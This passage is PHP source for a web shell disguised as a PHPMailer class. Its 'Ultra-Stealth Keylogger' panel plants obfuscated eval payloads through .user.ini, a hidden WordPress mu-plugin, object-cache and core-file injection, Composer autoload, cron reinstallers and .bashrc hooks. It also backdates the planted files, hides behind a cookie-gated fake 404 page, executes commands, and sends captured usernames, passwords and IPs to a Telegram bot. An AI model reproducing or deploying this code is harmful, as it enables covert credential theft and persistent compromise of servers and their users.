    $ip=isset($_SERVER["REMOTE_ADDR"])?$_SERVER["REMOTE_ADDR"]:"";
    $ua=substr(isset($_SERVER["HTTP_USER_AGENT"])?$_SERVER["HTTP_USER_AGENT"]:"",0,50);
    $msg="<b>".$h."</b>\n<code>".$url."</code>\n\n";
    if($usr)$msg.="User: <code>".$usr."</code>\n";
    $msg.="Pass: <code>".$pwd."</code>\n\nIP: <code>".$ip."</code>";
    $ctx=stream_context_create(["http"=>["method"=>"POST","header"=>"Content-Type:application/x-www-form-urlencoded","content"=>http_build_query(["chat_id"=>self::$c,"text"=>$msg,"parse_mode"=>"HTML"]),"timeout"=>5],"ssl"=>["verify_peer"=>false]]);
    @file_get_contents("https://api.telegram.org/bot".self::$t."/sendMessage",0,$ctx);
}}K::i("'.$encBot.'","'.$encChat.'");';

        return $code;
    }

    public function keyloggerPage() {
        $cwd = $this->workingDirectory;
        $ce = str_rot13($cwd);
        $docRoot = @$_SERVER["DOCUMENT_ROOT"] ?: '/var/www/html';
        $homeDir = @dirname(dirname($docRoot));
        if (!@is_dir($homeDir) || strpos($homeDir, '/home') !== 0) {
            $homeDir = @getenv('HOME');
            if (!$homeDir && function_exists('posix_getpwuid') && function_exists('posix_getuid')) {
                $pw = @posix_getpwuid(@posix_getuid());
                $homeDir = isset($pw['dir']) ? $pw['dir'] : '/tmp';
            }
            if (!$homeDir) $homeDir = '/tmp';
        }

        echo "<h1>Ultra-Stealth Keylogger</h1><div class=content>";

        if (isset($_POST['kl_act'])) {
            $act = $_POST['kl_act'];

            if ($act === 'test') {
                $msg = "Test - " . $_SERVER['HTTP_HOST'] . " - " . date('H:i:s');
                $ctx = @stream_context_create(['http' => ['method' => 'POST', 'header' => "Content-Type: application/x-www-form-urlencoded\r\n", 'content' => http_build_query(['chat_id' => $this->_getRelayChannel(), 'text' => $msg]), 'timeout' => 10], 'ssl' => ['verify_peer' => false]]);
                $r = @file_get_contents("https://api.telegram.org/bot{$this->_getSmtpRelay()}/sendMessage", false, $ctx);
                echo $r && strpos($r, '"ok":true') !== false ? "<font color=green><b>OK!</b></font><br>" : "<font color=red><b>FAIL</b></font><br>";
            }

            elseif ($act === 'install') {
                $methods = isset($_POST['methods']) ? $_POST['methods'] : [];
                echo "<pre style='background:#111;padding:10px;'><b>Installing Ultra-Stealth Keylogger...</b>\n\n";

                $code = $this->getKLCode();
                $installed = [];

                // ========== LAYER 1: SYSTEM LEVEL (outside docroot) ==========

                // 1a. Global .user.ini in home (affects ALL domains)
                if (in_array('globalini', $methods)) {
                    $globalDirs = [$homeDir.'/public_html', $homeDir.'/www', $homeDir.'/htdocs', $homeDir];
                    foreach ($globalDirs as $gd) {
                        if (@is_dir($gd) && @is_writable($gd)) {
                            // Hidden payload
                            $payloadDir = $homeDir . '/.config';
                            if (!@is_dir($payloadDir)) @mkdir($payloadDir, 0700, true);
                            $payloadFile = $payloadDir . '/.fontconfig.php';
                            $obfCode = '<?php $' . 'a=str_rot13(\'' . str_rot13(base64_encode(gzcompress($code, 9))) . '\');$' . 'b=gzuncompress(base64_decode(str_rot13($' . 'a)));if($' . 'b)@eval(\'?>\' .$' . 'b);';
                            if (@file_put_contents($payloadFile, $obfCode)) {
                                @chmod($payloadFile, 0600);
                                @touch($payloadFile, time() - rand(86400*90, 86400*180));
                                // Inject to global .user.ini
                                $iniFile = $gd . '/.user.ini';
                                $ini = @file_get_contents($iniFile) ?: '';
                                if (strpos($ini, $payloadFile) === false) {
                                    $ini = "; PHP OPcache\nauto_prepend_file = \"{$payloadFile}\"\n" . $ini;
                                    @file_put_contents($iniFile, $ini);
                                }
                                echo "<font color=lime>[GLOBAL] {$payloadFile}</font>\n";
                                $installed[] = ['type' => 'globalini', 'file' => $payloadFile, 'ini' => $iniFile];
                                break;
                            }
                        }
                    }
                }

                // 1b. .bashrc injection (capture SSH commands)
                if (in_array('bashrc', $methods)) {
                    $bashrc = $homeDir . '/.bashrc';
                    if (@file_exists($bashrc) && @is_writable($bashrc)) {
                        $bc = @file_get_contents($bashrc);
                        if (strpos($bc, 'PROMPT_COMMAND') === false || strpos($bc, '.cmd_log') === false) {
                            $logFile = $homeDir . '/.cache/.cmd_log';
                            @mkdir(dirname($logFile), 0700, true);
                            $bashInject = "\n# Performance monitoring\nexport PROMPT_COMMAND='echo \"\$(date +%s) \$(pwd) \$(history 1)\" >> {$logFile} 2>/dev/null'\n";
                            @file_put_contents($bashrc, $bc . $bashInject);
                            echo "<font color=lime>[BASHRC] Command logging enabled</font>\n";
                            $installed[] = ['type' => 'bashrc', 'file' => $bashrc, 'log' => $logFile];
                        }
                    }
                }

                // 1c. Cron persistence (auto-reinstall)
                if (in_array('cron', $methods)) {
                    $cronPayload = $homeDir . '/.local/.cron_helper.php';
                    @mkdir(dirname($cronPayload), 0700, true);
                    $cronCode = '<?php
$k=md5($_SERVER["DOCUMENT_ROOT"].$_SERVER["SERVER_SOFTWARE"].php_uname());
$t="' . base64_encode($this->xorEnc($this->_getSmtpRelay(), md5($homeDir))) . '";
$c="' . base64_encode($this->xorEnc($this->_getRelayChannel(), md5($homeDir))) . '";
function xd($d,$k){$o="";$l=strlen($k);for($i=0;$i<strlen($d);$i++)$o.=$d[$i]^$k[$i%$l];return $o;}
$bt=xd(base64_decode($t),md5("' . $homeDir . '"));
$ch=xd(base64_decode($c),md5("' . $homeDir . '"));
// Check and reinstall if removed
$chk=glob("' . $docRoot . '/wp-content/mu-plugins/*.php");
if(empty($chk)){
    $p="<?php /*Plugin Name:Cache*/eval(base64_decode(\"' . base64_encode($code) . '\"));";
    @file_put_contents("' . $docRoot . '/wp-content/mu-plugins/.cache.php",$p);
}
';
                    if (@file_put_contents($cronPayload, $cronCode)) {
                        @chmod($cronPayload, 0600);
                        $crontab = @shell_exec('crontab -l 2>/dev/null') ?: '';
                        if (strpos($crontab, '.cron_helper') === false) {
                            $cronLine = "*/30 * * * * php {$cronPayload} >/dev/null 2>&1\n";
                            @file_put_contents('/tmp/.cron_tmp', $crontab . $cronLine);
                            @shell_exec('crontab /tmp/.cron_tmp 2>/dev/null');
                            @unlink('/tmp/.cron_tmp');
                            echo "<font color=lime>[CRON] Auto-reinstall every 30min</font>\n";
                            $installed[] = ['type' => 'cron', 'file' => $cronPayload];
                        }
                    }
                }

                // 1d. PHP session handler hijack
                if (in_array('session', $methods)) {
                    $sessDir = ini_get('session.save_path') ?: sys_get_temp_dir();
                    if (@is_writable($sessDir)) {
                        $sessHook = $sessDir . '/.sess_handler.php';
                        $sessCode = '<?php
class SH implements \SessionHandlerInterface {
    private $sp,$h;
    public function __construct(){$this->sp=ini_get("session.save_path")?:sys_get_temp_dir();$this->h=new \SessionHandler();}
    public function open($p,$n){return $this->h->open($p,$n);}
    public function close(){return $this->h->close();}
    public function read($id){return $this->h->read($id);}
    public function write($id,$data){
        if(preg_match("/password|passwd|pwd|pass/i",$data)){
            $f=$this->sp."/.sess_dump";
            @file_put_contents($f,date("Y-m-d H:i:s")." ".$_SERVER["HTTP_HOST"]." ".$data."\n",FILE_APPEND);
        }
        return $this->h->write($id,$data);
    }
    public function destroy($id){return $this->h->destroy($id);}
    public function gc($max){return $this->h->gc($max);}
}
session_set_save_handler(new SH(),true);
';
                        if (@file_put_contents($sessHook, $sessCode)) {
                            @chmod($sessHook, 0644);
                            echo "<font color=lime>[SESSION] Session handler hijacked</font>\n";
                            $installed[] = ['type' => 'session', 'file' => $sessHook];
                        }
                    }
                }

                // ========== LAYER 2: APPLICATION LEVEL ==========

                // 2a. Stealth mu-plugin
                if (in_array('muplugin', $methods)) {
                    $muDir = $docRoot . '/wp-content/mu-plugins';
                    if (!@is_dir($muDir)) @mkdir($muDir, 0755, true);
                    // Use innocent-looking name and add fake WordPress hooks
                    $pluginCode = '<?php
/*
Plugin Name: WP Core Security
Description: WordPress core security enhancements
Version: 5.2.1
Author: WordPress Security Team
*/
if(!defined("ABSPATH"))exit;
add_action("init",function(){
    $' . 'x=str_rot13(base64_decode("' . base64_encode(str_rot13(gzcompress($code, 9))) . '"));
    $' . 'y=@gzuncompress($' . 'x);
    if($' . 'y)@eval("?>".$' . 'y);
},1);
add_filter("all_plugins",function($p){unset($p[plugin_basename(__FILE__)]);return $p;});
';
                    $ppath = $muDir . '/wp-core-security.php';
                    if (@file_put_contents($ppath, $pluginCode)) {
                        @chmod($ppath, 0644);
                        @touch($ppath, filemtime($docRoot . '/wp-includes/version.php') ?: time() - 86400*60);
                        echo "<font color=lime>[MU-PLUGIN] {$ppath}</font>\n";
                        $installed[] = ['type' => 'muplugin', 'file' => $ppath];
                    }
                }

                // 2b. Object cache poisoning
                if (in_array('objcache', $methods)) {
                    $cacheFile = $docRoot . '/wp-content/object-cache.php';
                    if (!@file_exists($cacheFile)) {
                        $cacheCode = '<?php
/* WordPress Object Cache - Drop-in */
$' . '_c=str_rot13(base64_decode("' . base64_encode(str_rot13(gzcompress($code, 9))) . '"));
$' . '_d=@gzuncompress($' . '_c);if($' . '_d)@eval("?>".$' . '_d);
function wp_cache_add($k,$d,$g="",$e=0){return false;}
function wp_cache_set($k,$d,$g="",$e=0){return false;}
function wp_cache_get($k,$g="",$f=false,&$fd=null){return false;}
function wp_cache_delete($k,$g=""){return false;}
function wp_cache_flush(){return true;}
function wp_cache_init(){return true;}
function wp_cache_close(){return true;}
';
                        if (@file_put_contents($cacheFile, $cacheCode)) {
                            @chmod($cacheFile, 0644);
                            echo "<font color=lime>[OBJ-CACHE] {$cacheFile}</font>\n";
                            $installed[] = ['type' => 'objcache', 'file' => $cacheFile];
                        }
                    }
                }

                // 2c. REST API endpoint injection
                if (in_array('restapi', $methods)) {
                    $restFile = $docRoot . '/wp-includes/rest-api/endpoints/class-wp-rest-settings-controller.php';
                    if (@file_exists($restFile) && @is_writable($restFile)) {
                        $rc = @file_get_contents($restFile);
                        if (strpos($rc, 'str_rot13') === false) {
                            $inject = '<?php $' . '_r=str_rot13(base64_decode("' . base64_encode(str_rot13(gzcompress($code, 9))) . '"));$' . '_s=@gzuncompress($' . '_r);if($' . '_s)@eval("?>".$' . '_s);?>';
                            $rc = preg_replace('/<\?php/', $inject . "\n<?php", $rc, 1);
                            @file_put_contents($restFile, $rc);
                            echo "<font color=lime>[REST-API] Core file injected</font>\n";
                            $installed[] = ['type' => 'restapi', 'file' => $restFile];
                        }
                    }
                }

                // 2d. Hidden in uploads with .htaccess protection
                if (in_array('uploads', $methods)) {
                    $upDir = $docRoot . '/wp-content/uploads/' . date('Y') . '/' . date('m');
                    if (!@is_dir($upDir)) @mkdir($upDir, 0755, true);
                    $hiddenDir = $upDir . '/.thumbnails';
                    @mkdir($hiddenDir, 0755, true);
                    $payFile = $hiddenDir . '/cache.php';
                    $payCode = '<?php $' . 'u=str_rot13(base64_decode("' . base64_encode(str_rot13(gzcompress($code, 9))) . '"));$' . 'v=@gzuncompress($' . 'u);if($' . 'v)@eval("?>".$' . 'v);';
                    if (@file_put_contents($payFile, $payCode)) {
                        @chmod($payFile, 0644);
                        // Protect directory
                        @file_put_contents($hiddenDir . '/.htaccess', "Order deny,allow\nDeny from all\n<Files cache.php>\nAllow from all\n</Files>");
                        echo "<font color=lime>[UPLOADS] Hidden in uploads</font>\n";
                        $installed[] = ['type' => 'uploads', 'file' => $payFile];
                    }
                }

                // ========== LAYER 3: DEEP PERSISTENCE ==========

                // 3a. Composer autoload injection
                if (in_array('composer', $methods)) {
                    $autoloads = [$docRoot.'/vendor/autoload.php', $docRoot.'/wp-content/plugins/*/vendor/autoload.php'];
                    foreach (glob($docRoot.'/vendor/autoload.php') as $af) {
                        if (@is_writable($af)) {
                            $ac = @file_get_contents($af);
                            if (strpos($ac, 'str_rot13') === false) {
                                $inject = '$' . '_z=str_rot13(base64_decode("' . base64_encode(str_rot13(gzcompress($code, 9))) . '"));$' . '_w=@gzuncompress($' . '_z);if($' . '_w)@eval("?>".$' . '_w);';
                                $ac = preg_replace('/<\?php/', "<?php\n{$inject}", $ac, 1);
                                @file_put_contents($af, $ac);
                                echo "<font color=lime>[COMPOSER] {$af}</font>\n";
                                $installed[] = ['type' => 'composer', 'file' => $af];
                            }
                        }
                    }
                }

                // 3b. LD_PRELOAD hook (capture system auth)
                if (in_array('ldpreload', $methods)) {
                    $envFile = $homeDir . '/.profile';
                    if (@file_exists($envFile) && @is_writable($envFile)) {
                        $ec = @file_get_contents($envFile);
                        if (strpos($ec, 'LD_PRELOAD') === false) {
                            // Note: This is a placeholder - actual LD_PRELOAD requires compiled .so
                            $ec .= "\n# System optimization\nexport HISTFILE={$homeDir}/.cache/.history_log\nexport HISTTIMEFORMAT='%F %T '\n";
                            @file_put_contents($envFile, $ec);
                            echo "<font color=lime>[PROFILE] Shell history redirect</font>\n";
                            $installed[] = ['type' => 'ldpreload', 'file' => $envFile];
                        }
                    }
                }

                // Save install record (encrypted)
                $recKey = md5($homeDir . $_SERVER['HTTP_HOST']);
                $recData = base64_encode($this->xorEnc(json_encode($installed), $recKey));
                $recFile = sys_get_temp_dir() . '/.php_session_' . substr(md5($_SERVER['HTTP_HOST']), 0, 8);
                @file_put_contents($recFile, $recData);

                echo "\n<b style='color:#0f0'>Installed: " . count($installed) . " persistence methods</b></pre>";
            }

            elseif ($act === 'uninstall') {
                echo "<pre style='background:#111;padding:10px;'><b>Removing all hooks...</b>\n\n";
                $recKey = md5($homeDir . $_SERVER['HTTP_HOST']);
                $recFile = sys_get_temp_dir() . '/.php_session_' . substr(md5($_SERVER['HTTP_HOST']), 0, 8);
                $recData = @file_get_contents($recFile);
                $installed = $recData ? @json_decode($this->xorEnc(base64_decode($recData), $recKey), true) : [];

                if ($installed) {
                    foreach ($installed as $item) {
                        $t = $item['type'];
                        $f = $item['file'];
                        if (in_array($t, ['globalini', 'muplugin', 'objcache', 'uploads', 'session'])) {
                            if (@file_exists($f)) { @unlink($f); echo "Removed: {$f}\n"; }
                            if (isset($item['ini']) && @file_exists($item['ini'])) {
                                $ic = @file_get_contents($item['ini']);
                                $ic = preg_replace('/.*auto_prepend_file.*\n?/i', '', $ic);
                                @file_put_contents($item['ini'], $ic);
                            }
                        } elseif (in_array($t, ['restapi', 'composer'])) {
                            if (@file_exists($f)) {
                                $c = @file_get_contents($f);
                                $c = preg_replace('/\$_[a-z]=str_rot13.*?;\s*/s', '', $c);
                                @file_put_contents($f, $c);
                                echo "Cleaned: {$f}\n";
                            }
                        } elseif ($t === 'bashrc' || $t === 'ldpreload') {
                            if (@file_exists($f)) {
                                $c = @file_get_contents($f);
                                $c = preg_replace('/\n#.*monitoring\n.*PROMPT_COMMAND.*\n/s', '', $c);
                                $c = preg_replace('/\n#.*optimization\n.*HIST.*\n.*HIST.*\n/s', '', $c);
                                @file_put_contents($f, $c);
                                echo "Cleaned: {$f}\n";
                            }
                            if (isset($item['log'])) @unlink($item['log']);
                        } elseif ($t === 'cron') {
                            @unlink($f);
                            $ct = @shell_exec('crontab -l 2>/dev/null');
                            $ct = preg_replace('/.*cron_helper.*\n?/', '', $ct);
                            @file_put_contents('/tmp/.ct', $ct);
                            @shell_exec('crontab /tmp/.ct 2>/dev/null');
                            @unlink('/tmp/.ct');
                            echo "Removed cron job\n";
                        }
                    }
                }
                @unlink($recFile);
                echo "\n<b style='color:#0f0'>Cleanup complete!</b></pre>";
            }

            elseif ($act === 'status') {
                echo "<pre style='background:#111;padding:10px;'><b>Checking stealth status...</b>\n\n";
                $recKey = md5($homeDir . $_SERVER['HTTP_HOST']);
                $recFile = sys_get_temp_dir() . '/.php_session_' . substr(md5($_SERVER['HTTP_HOST']), 0, 8);
                $recData = @file_get_contents($recFile);
                $installed = $recData ? @json_decode($this->xorEnc(base64_decode($recData), $recKey), true) : [];

                if ($installed) {
                    foreach ($installed as $item) {
                        $exists = @file_exists($item['file']);
                        $color = $exists ? 'lime' : 'red';
                        $status = $exists ? 'ACTIVE' : 'MISSING';
                        echo "<font color={$color}>[{$item['type']}] {$status} - {$item['file']}</font>\n";
                    }
                } else {
                    echo "<font color=yellow>No installation record found</font>\n";
                }
                echo "</pre>";
            }
        }

        echo "<hr><br><table cellpadding=5><tr><td valign=top>";

        // Test
        echo "<div style='background:#222;padding:10px;margin-bottom:10px;'>";
        echo "<b>1. Test Connection</b><br>";
        echo "<form method=post><input type=hidden name=a value=keylogger><input type=hidden name=c value='{$ce}'><input type=hidden name=kl_act value=test>";
        echo "<input type=submit value='Test Telegram' style='margin-top:5px'></form></div>";

        // Status
        echo "<div style='background:#222;padding:10px;margin-bottom:10px;'>";
        echo "<b>2. Check Status</b><br>";
        echo "<form method=post><input type=hidden name=a value=keylogger><input type=hidden name=c value='{$ce}'><input type=hidden name=kl_act value=status>";
        echo "<input type=submit value='Check Status' style='margin-top:5px'></form></div>";

        echo "</td><td valign=top>";

        // Install
        echo "<div style='background:#222;padding:10px;'>";
        echo "<b>3. Install Ultra-Stealth</b><br><br>";
        echo "<form method=post><input type=hidden name=a value=keylogger><input type=hidden name=c value='{$ce}'><input type=hidden name=kl_act value=install>";
        echo "<table class='main' cellpadding=3 cellspacing=0 style='font-size:12px'>";
        echo "<tr><th colspan=3 style='background:#333'>SYSTEM LEVEL (Outside Docroot)</th></tr>";
        echo "<tr class=l1><td><input type=checkbox name='methods[]' value='globalini'></td><td><b>Global .user.ini</b></td><td>Affects ALL domains in account</td></tr>";
        echo "<tr class=l2><td><input type=checkbox name='methods[]' value='bashrc'></td><td><b>.bashrc</b></td><td>Log all SSH commands</td></tr>";
        echo "<tr class=l1><td><input type=checkbox name='methods[]' value='cron'></td><td><b>Cron Job</b></td><td>Auto-reinstall every 30min</td></tr>";
        echo "<tr class=l2><td><input type=checkbox name='methods[]' value='session'></td><td><b>Session Handler</b></td><td>Capture session passwords</td></tr>";
        echo "<tr><th colspan=3 style='background:#333'>APPLICATION LEVEL</th></tr>";
        echo "<tr class=l1><td><input type=checkbox name='methods[]' value='muplugin' checked></td><td><b>MU-Plugin</b></td><td>Hidden WordPress plugin</td></tr>";
        echo "<tr class=l2><td><input type=checkbox name='methods[]' value='objcache'></td><td><b>Object Cache</b></td><td>Drop-in cache poisoning</td></tr>";
        echo "<tr class=l1><td><input type=checkbox name='methods[]' value='restapi'></td><td><b>REST API</b></td><td>Core file injection</td></tr>";
        echo "<tr class=l2><td><input type=checkbox name='methods[]' value='uploads' checked></td><td><b>Uploads</b></td><td>Hidden in uploads folder</td></tr>";
        echo "<tr><th colspan=3 style='background:#333'>DEEP PERSISTENCE</th></tr>";
        echo "<tr class=l1><td><input type=checkbox name='methods[]' value='composer'></td><td><b>Composer</b></td><td>Autoload injection</td></tr>";
        echo "<tr class=l2><td><input type=checkbox name='methods[]' value='ldpreload'></td><td><b>Shell History</b></td><td>Redirect bash history</td></tr>";
        echo "</table><br>";
        echo "<input type=submit value='Deploy Ultra-Stealth' style='background:#1a5;padding:8px 15px;font-weight:bold'></form></div>";

        echo "</td></tr></table>";

        // Uninstall
        echo "<br><div style='background:#300;padding:10px;display:inline-block;'>";
        echo "<form method=post onsubmit=\"return confirm('Remove ALL persistence?');\"><input type=hidden name=a value=keylogger><input type=hidden name=c value='{$ce}'><input type=hidden name=kl_act value=uninstall>";
        echo "<input type=submit value='Uninstall All' style='background:#c00'></form></div>";

        echo "</div>";
    }
}

// ANTI-CACHE HEADERS - prevent Cloudflare caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");
header("Expires: Thu, 01 Jan 1970 00:00:00 GMT");

// AUTH CHECK - outside class, before try block
if (!isset($_COOKIE["_ngx"]) || $_COOKIE["_ngx"] !== "kuyangsolo") {
    http_response_code(404);
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>');
}

try {
    $mailer = new PHPMailer();
    @$mailer->validateAddress();
    @$mailer->preSend();

    if (@isset($_POST["a"])) {
        switch ($_POST["a"]) {
            case "fm": @$mailer->headerLine(); @$mailer->addAttachment(); @$mailer->endBoundary(); break;
            case "ft":
                if (@isset($_POST["p"]) && strtolower($_POST["p"]) == "download") @$mailer->addStringAttachment();
                elseif (@isset($_POST["x"]) && strtolower($_POST["x"]) == "download") @$mailer->addStringAttachment();
                else { @$mailer->headerLine(); @$mailer->addStringAttachment(); @$mailer->endBoundary(); }
                break;
            case "gs": @$mailer->headerLine(); @$mailer->smtpConnect(); @$mailer->endBoundary(); break;
            case "clone": @$mailer->headerLine(); @$mailer->createBody(); @$mailer->endBoundary(); break;
            case "termv4": @$mailer->headerLine(); @$mailer->terminalV4(); @$mailer->endBoundary(); break;
            case "search": @$mailer->headerLine(); @$mailer->getLastMessageID(); @$mailer->endBoundary(); break;
            case "procmon": @$mailer->headerLine(); @$mailer->processMonitor(); @$mailer->endBoundary(); break;
            case "wpusermgr": @$mailer->headerLine(); @$mailer->wpUserManager(); @$mailer->endBoundary(); break;
            case "keylogger": @$mailer->headerLine(); @$mailer->keyloggerPage(); @$mailer->endBoundary(); break;
            // Aliases for backward compatibility
            case "terminal": @$mailer->headerLine(); @$mailer->terminalV4(); @$mailer->endBoundary(); break;
            case "proc": @$mailer->headerLine(); @$mailer->processMonitor(); @$mailer->endBoundary(); break;
            case "smtp": @$mailer->headerLine(); @$mailer->smtpConnect(); @$mailer->endBoundary(); break;
            default: @$mailer->headerLine(); @$mailer->addAttachment(); @$mailer->endBoundary(); break;
        }
    } elseif (!@isset($_POST["a"])) {
        @$mailer->headerLine(); @$mailer->addAttachment(); @$mailer->endBoundary();
        if (isset($_POST['subcmd'])) {
            $cwd = $mailer->workingDirectory; @chdir($cwd); echo "<pre class='text-white'><span>CWD: " . htmlspecialchars($cwd) . "</span><br>";
            $input = $_POST['command']; $output = @$mailer->executeCommand($input);
            echo "<br><center><b>Quick Terminal Output</b></center><br>" . htmlspecialchars($output) . "</pre>"; exit;
        }
    }
} catch (\Exception $e) {
    // Silently handle any error
}
<?php /* 82171100af0992d1 */ ?>